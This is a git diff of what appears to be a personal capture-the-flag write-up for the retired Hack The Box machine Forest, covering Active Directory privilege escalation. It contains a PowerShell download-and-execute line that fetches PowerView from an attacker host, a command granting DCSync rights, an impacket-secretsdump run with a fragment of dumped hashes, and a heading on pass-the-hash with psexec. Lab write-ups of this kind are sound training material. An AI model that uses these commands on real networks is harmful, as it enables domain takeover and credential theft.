@@ -47,7 +47,9 @@ The command completed successfully.
 
 *Evil-WinRM* PS clark:\>
 ```
+## Granting newly created user stuart who is member of Exchange Windows Permissions group 'DCSync rights privilege' 
 After creating new user `stuart` and adding it to `Exchange Windows Permissions` group, we can use `powerview.ps1`(uploaded to forest machine using command `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.105:8000/powerview.ps1')`) to grant `stuart` newly created user who is member of `Exchange Windows Permissions` group `DCSync` rights privilege after which newly created `stuart` user can dump hashes of all users on forest machine. To do this  command `Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity stuart -Rights DCSync` is used.
+## Using impacket-secretsdump tool to dump hashes
 Now using `impacket-secretsdump` tool to dump hashes.
 ```bash
 ~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/forest_retired/smb ❯ impacket-secretsdump htb.local/stuart:1234567@10.10.10.161
@@ -156,5 +158,6 @@ EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
 EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up...
 ```
-
+## Using impacket-psexec tool to login as administrator by passing administrator hash
+![[Pasted image 20210727214406.png]]
 
